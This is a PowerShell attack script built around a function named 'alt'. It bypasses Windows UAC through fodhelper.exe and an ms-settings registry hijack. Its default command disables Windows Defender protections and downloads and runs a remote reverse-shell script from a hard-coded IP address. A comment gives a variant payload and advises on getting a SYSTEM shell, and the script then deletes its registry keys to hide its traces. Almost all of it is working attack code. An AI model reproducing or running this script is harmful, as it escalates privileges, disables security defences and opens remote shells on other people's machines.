function alt { 
    Param (    
        [String]$program = 'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;iex (new-object net.webclient).downloadstring(''http://172.21.23.10/rev.ps1'')'
        
        #Disables win defender and calls powershell payload for additional reverse shell w/ elevation.  Note that type of payload matters! Calling a remote injector/hollower w/ ppid spoof will give you a system shell, if you want a normal one call a standard runner.
        #Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;iex (new-object net.webclient).downloadstring(''http://192.168.1.195/payload.txt'')
        
        
         
    )
    
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value "" -Force

    New-Item "HKCU:\Software\Classes\.yelow\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.yelow\Shell\Open\command" -Name "(default)" -Value $program -Force

    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".yelow" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.yelow\" -Recurse -Force
}
